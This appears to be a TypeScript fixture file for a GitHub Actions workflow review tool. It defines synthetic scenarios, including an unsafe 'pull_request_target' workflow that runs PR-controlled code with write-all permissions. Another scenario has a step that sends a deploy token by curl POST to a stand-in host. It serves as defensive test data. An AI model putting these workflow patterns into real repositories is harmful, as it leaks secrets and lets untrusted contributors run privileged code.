import { identity } from './common';
const pin='11bd71901bbe5b1630ceea73d27597364c9af683';
const base=`name: Build and test
on:
  pull_request:
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@${pin}
        with:
          persist-credentials: false
      - run: echo "Static verification complete"
`;
const safe=base.replace('Static verification complete','Workflow configuration verified');
const risky=`name: PR validation
on:
  pull_request_target:
permissions: write-all
jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@${pin}
        with:
          ref: \${{ github.event.pull_request.head.sha }}
      - run: npm install && npm test
`;
const exfil=base+`      - name: Publish diagnostics
        env:
          DEPLOY_TOKEN: \${{ secrets.DEPLOY_TOKEN }}
        run: |
          curl --fail --request POST --data "$DEPLOY_TOKEN" https://telemetry.example.invalid/collect
`;
export const scenarios=[
 {id:'unrelated',label:'Application change',description:'An application-only push. No workflow review needed.',path:'src/search.ts',before:'export const pageSize = 20;\n',after:'export const pageSize = 30;\n'},
 {id:'safe',label:'Safe workflow change',description:'Read-only token, pinned checkout, no untrusted interpolation.',path:'.github/workflows/ci.yml',before:base,after:safe},
 {id:'unsafe-pr',label:'Unsafe PR handling',description:'A privileged trigger checks out and executes PR-controlled code.',path:'.github/workflows/ci.yml',before:base,after:risky},
 {id:'exfiltration',label:'Suspicious secret transfer',description:'A secret is wired into an outbound HTTP POST.',path:'.github/workflows/ci.yml',before:base,after:exfil}
];
export function fixture(id:string){const i=scenarios.findIndex(x=>x.id===id);if(i<0)throw Error('Unknown fixture');const s=scenarios[i];const e:any={mode:'fixture',delivery:`synthetic-${id}-v1`,repository:'ghawa-demo/travel-platform',ref:'refs/heads/main',before:'a'.repeat(40),after:String(i+1).repeat(40),created:false,deleted:false,forced:false,fixture:id,label:s.label};e.reviewId=identity(e);return e;}
export function fixtureEvidence(e:any){const s=scenarios.find(x=>x.id===e.fixture)!;return {...e,coverage:{changeDetection:'complete',contents:'complete',agent:'not_started',limitations:[],notes:['Synthetic before/after data. No GitHub API call was made.']},changedFiles:[{path:s.path,status:'modified',before:s.before,after:s.after,oldPath:s.path}],files:s.path.startsWith('.github/')?[{path:s.path,status:'modified',before:s.before,after:s.after,oldPath:s.path}]:[],compare:{source:'synthetic fixture',totalCommits:1,pages:1},contextInventory:[],findings:[],questions:[]};}
